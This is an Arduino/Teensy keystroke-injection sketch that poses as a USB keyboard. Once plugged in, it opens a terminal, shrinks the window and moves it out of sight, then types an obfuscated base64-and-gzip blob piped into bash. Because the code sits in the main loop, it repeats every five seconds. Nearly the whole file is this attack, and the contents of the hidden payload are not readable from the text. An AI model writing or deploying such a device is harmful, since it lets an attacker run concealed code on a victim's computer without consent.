#include "Keyboard.h"
#include "stdio.h"
#include "stdlib.h"
#define INTER_T 50
#define INTER_ANIM 300

void lettre(char c) {
  Keyboard.press(c);
  delay(7);
  Keyboard.release(c);
  delay(7);
}

void chaine(char chaine[])
{
  for (short i = 0; i < strlen(chaine); i++) {
    lettre(chaine[i]);
  }
}


void t_t_touche(char t1 ,char t2) {
  Keyboard.press(t1);
  Keyboard.press(t2);
  delay(INTER_T);
  Keyboard.release(t1);
  Keyboard.release(t2);
  delay(INTER_T);
}

void windows(){
  Keyboard.press(KEY_LEFT_GUI);
  delay(INTER_T);
  Keyboard.release(KEY_LEFT_GUI);
  delay(INTER_ANIM);
}

void enter(){
  Keyboard.press(KEY_ENTER);
  delay(INTER_T);
  Keyboard.release(KEY_ENTER);
  delay(INTER_ANIM);
}

void touche(char t) {
  Keyboard.press(t);
  delay(INTER_T);
  Keyboard.release(t);
  delay(INTER_T);
}

void setup() { 
  Keyboard.begin(); 
  Serial.begin(9600);

}

void loop() {
  delay(5000);

  //OPEN Terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_T);
  delay(INTER_T);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release(KEY_T);
  delay(INTER_T);
  delay(INTER_T);


  // ALT F8 Resize
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.press(KEY_F8);
  delay(INTER_T);
  Keyboard.release(KEY_F8);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(INTER_T);
  
  

    //Resize
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.press(KEY_DOWN);
  delay(INTER_T);
  Keyboard.release(KEY_DOWN);
  Keyboard.press(KEY_UP);
  delay(INTER_T);
  Keyboard.release(KEY_UP);
  Keyboard.press(KEY_LEFT);
  delay(INTER_T);
  Keyboard.release(KEY_LEFT);
  Keyboard.press(KEY_RIGHT);
  delay(INTER_T);
  Keyboard.release(KEY_RIGHT);
  Keyboard.set_modifier(0);
  Keyboard.send_now();


  // MOVE ALT F7
  Keyboard.press(KEY_ENTER);
  delay(INTER_T);
  Keyboard.release(KEY_ENTER);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.press(KEY_F7);
  delay(INTER_T);
  Keyboard.release(KEY_F7);
  Keyboard.set_modifier(0);
  Keyboard.send_now();  
 

    //Resize
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.press(KEY_DOWN);
  delay(INTER_T);
  Keyboard.release(KEY_DOWN);
  Keyboard.press(KEY_DOWN);
  delay(INTER_T);
  Keyboard.release(KEY_DOWN);
  Keyboard.press(KEY_RIGHT);
  delay(INTER_T);
  Keyboard.release(KEY_RIGHT);
  Keyboard.press(KEY_RIGHT);
  delay(INTER_T);
  Keyboard.release(KEY_RIGHT);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  

  chaine ("echo 'H4sIAA/f0GUA/6WT207CQBCG73mKP0sN25ClVkOJlJIYX4ObZg+ySZ0lWI0E++5sDxy8MBaZm5020/lm/n9r3BYGlhBwY0khWrs3He1yIvsevTgyVmkqrS4iiHK30b74YYlI6c+IPooiTKHcAD5kFnCZl2CBYWHavNpYesU0nsxmk/jpcZJMISRiiI0v4lquHQSBLZowttDLJhi+4RTEM8gj8RX753ILoTDCikYhSweDpr3/pMgYa3O/Buc2u09hsfDL8DiBAA/2Q1PhDnEShn5WOx7XRzfyuUmwr89q2DZTjnSH8EudBvVFVVfIwuMMLRcZjuQaWKfjrIH+gPUTxDPmgZ3HSfWnFFheeJHiBGp6sRWd9/GiXWuJysu8vyVXOCJvcKS+ZhdKyUtHfjNE3myI7GtI50GreJ3940eg3qI3mAMtzddewgMAAA==' | base64 -d | gzip -d | bash");  
  enter();
  
   delay(5000);
}
